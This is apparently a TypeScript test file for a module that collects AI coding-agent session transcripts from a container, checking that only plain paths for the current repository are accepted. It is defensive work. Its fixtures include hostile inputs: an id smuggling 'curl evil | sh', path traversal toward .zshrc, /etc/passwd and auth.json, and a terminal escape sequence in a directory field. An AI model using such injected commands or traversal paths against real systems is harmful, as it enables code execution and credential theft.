import { expect, test } from "bun:test";
import { type ContainerFile, groupSessions, pullable } from "./handoff.ts";
import { claudeProjectDir } from "./sessions.ts";

const REPO = "/Users/me/src/app";
const ID = "0b6f7a4e-3c1d-4e8f-9a2b-1c3d5e7f9a0b";
const CODEX_A = "0199a213-81c0-7800-8aa1-bbab2a035a53";
const CODEX_B = "0199a213-81c0-7800-8aa1-bbab2a035a54";

function file(agent: "claude" | "codex", path: string, extra: Partial<ContainerFile> = {}): ContainerFile {
  return { agent, file: path, sha256: "x", modified: 0, ...extra };
}

function rollout(id: string): string {
  return `sessions/2026/10/17/rollout-2026-10-17T09-30-00-${id}.jsonl`;
}

test("groupSessions gathers each transcript with the files beside it, for this repo only", () => {
  const dir = claudeProjectDir(REPO);
  const sibling = claudeProjectDir(`${REPO}-old`);
  const groups = groupSessions(
    [
      file("claude", `projects/${dir}/${ID}.jsonl`, { id: ID, cwd: REPO }),
      file("claude", `projects/${dir}/${ID}/subagents/agent-1.jsonl`),
      file("claude", `projects/${sibling}/${ID}/subagents/agent-2.jsonl`),
      file("claude", `projects/${sibling}/1b6f7a4e-3c1d-4e8f-9a2b-1c3d5e7f9a0b.jsonl`, { id: "1b6f7a4e-3c1d-4e8f-9a2b-1c3d5e7f9a0b", cwd: `${REPO}-old` }),
      file("codex", rollout(CODEX_A), { id: CODEX_A, cwd: `${REPO}/sub` }),
      file("codex", rollout(CODEX_B), { id: CODEX_B, cwd: "/elsewhere" }),
    ],
    REPO,
  );
  expect(groups.map((group) => [group.agent, group.id, group.files.map((one) => one.file)])).toEqual([
    ["claude", ID, [`projects/${dir}/${ID}.jsonl`, `projects/${dir}/${ID}/subagents/agent-1.jsonl`]],
    ["codex", CODEX_A, [rollout(CODEX_A)]],
  ]);
});

test("groupSessions drops entries an agent in the container could forge", () => {
  const dir = claudeProjectDir(REPO);
  const groups = groupSessions(
    [
      file("claude", `projects/${dir}/${ID}.jsonl`, { id: ID, cwd: REPO }),
      file("claude", `projects/${dir}/${ID}/../../../../.zshrc`),
      file("claude", `projects/${dir}/${ID}`),
      file("claude", "/etc/passwd"),
      file("claude", `projects/-Users-me-src-other/${ID}.jsonl`, { id: ID, cwd: REPO }),
      file("claude", `projects/${dir}/1b6f7a4e-3c1d-4e8f-9a2b-1c3d5e7f9a0b.jsonl`, { id: "1b6f7a4e-3c1d-4e8f-9a2b-1c3d5e7f9a0b", cwd: `${REPO}/\u001b]52;c;eA==\u0007` }),
      file("codex", rollout(CODEX_A), { id: "x; curl evil | sh", cwd: REPO }),
      file("codex", rollout(CODEX_A), { id: CODEX_B, cwd: REPO }),
    ],
    REPO,
  );
  expect(groups.map((group) => [group.agent, group.id, group.files.map((one) => one.file)])).toEqual([
    ["claude", ID, [`projects/${dir}/${ID}.jsonl`]],
  ]);
});

test("pullable accepts only plain paths in the agent's folders for the repo", () => {
  const dir = claudeProjectDir(REPO);
  expect(pullable("claude", `projects/${dir}/${ID}.jsonl`, REPO)).toBe(true);
  expect(pullable("claude", `projects/${dir}-sub/${ID}.jsonl`, REPO)).toBe(true);
  expect(pullable("claude", `projects/${dir}/./${ID}.jsonl`, REPO)).toBe(false);
  expect(pullable("claude", `projects//${ID}.jsonl`, REPO)).toBe(false);
  expect(pullable("claude", "settings.json", REPO)).toBe(false);
  expect(pullable("codex", rollout(CODEX_A), REPO)).toBe(true);
  expect(pullable("codex", `${rollout(CODEX_A)}.zst`, REPO)).toBe(true);
  expect(pullable("codex", "auth.json", REPO)).toBe(false);
  expect(pullable("codex", "sessions/../auth.json", REPO)).toBe(false);
});
